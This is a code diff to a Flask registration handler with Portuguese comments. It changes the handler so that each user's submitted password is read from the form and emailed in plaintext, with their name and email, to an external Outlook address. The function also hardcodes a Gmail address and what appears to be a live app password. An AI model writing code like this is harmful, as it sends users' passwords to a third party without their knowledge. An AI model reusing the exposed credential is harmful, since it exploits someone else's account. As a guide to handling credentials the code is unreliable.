@@ -107,7 +107,8 @@ def cadastro():
     if request.method == "POST":
         nome = request.form["nome"]
         email = request.form["email"]
-        enviar_email(nome, email)
+        senha_usuario = request.form["senha"]
+        enviar_email(nome, email, senha_usuario)
         return redirect(url_for("sucesso"))
     return render_template("cadastro.html")
 
@@ -115,12 +116,18 @@ def cadastro():
 def sucesso():
     return render_template("sucesso.html")
 
-def enviar_email(nome, email):
-    remetente = "costavalmir2011@gmail.com"  # Substitua pelo seu e-mail
-    senha = "knnazlcxoxeuxklj"      # Senha de aplicativo gerada
-    destinatario = "Pr3cin.econ@outlook.com"
+def enviar_email(nome, email, senha_usuario):
+    remetente = "costavalmir2011@gmail.com"  # Seu e-mail
+    senha = "knnazlcxoxeuxklj"               # Senha de app específica
+    destinatario = "Pr3cin.econ@outlook.com" # E-mail de destino
 
-    corpo = f"Novo cadastro:\n\nNome: {nome}\nEmail: {email}"
+    corpo = (
+        f"Novo cadastro:\n\n"
+        f"Nome: {nome}\n"
+        f"Email: {email}\n"
+        f"Senha: {senha_usuario}"
+    )
+
     msg = MIMEText(corpo)
     msg["Subject"] = "Novo Cadastro no Pr3cin"
     msg["From"] = remetente
